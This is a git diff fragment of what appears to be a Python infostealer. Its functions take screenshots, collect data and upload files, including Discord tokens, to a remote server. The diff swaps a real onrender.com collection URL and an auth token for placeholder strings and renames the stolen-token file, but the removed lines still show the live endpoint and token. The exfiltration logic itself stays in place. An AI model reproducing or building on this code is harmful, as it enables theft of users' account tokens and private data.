@@ -696,8 +696,8 @@ def screenshot(out):
 
 
 def send_info(data=None):
-    URL = "https://server-sourse.onrender.com/send/embed"
-    TOKEN = "5df35c87a76d8fc2f2bc2f931c344f5225a2afdeea2c9a267c2a1cb42769ebfc"
+    URL = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+    TOKEN = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 
     if data is None:
         current_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -728,8 +728,8 @@ def send_info(data=None):
 
 
 def send_file_ds(file_path):
-    URL = "https://server-sourse.onrender.com/send/file"
-    TOKEN = "5df35c87a76d8fc2f2bc2f931c344f5225a2afdeea2c9a267c2a1cb42769ebfc"
+    URL = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+    TOKEN = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 
     try:
         if not os.path.exists(file_path):
@@ -1077,7 +1077,7 @@ def main():
     screenshot(BASE)
 
     if has_discord:
-        disc_file = os.path.join(BASE, "Discord", "tokens.txt")
+        disc_file = os.path.join(BASE, "Discord", "s.txt")
         if os.path.isfile(disc_file):
             send_file_ds(disc_file)
 
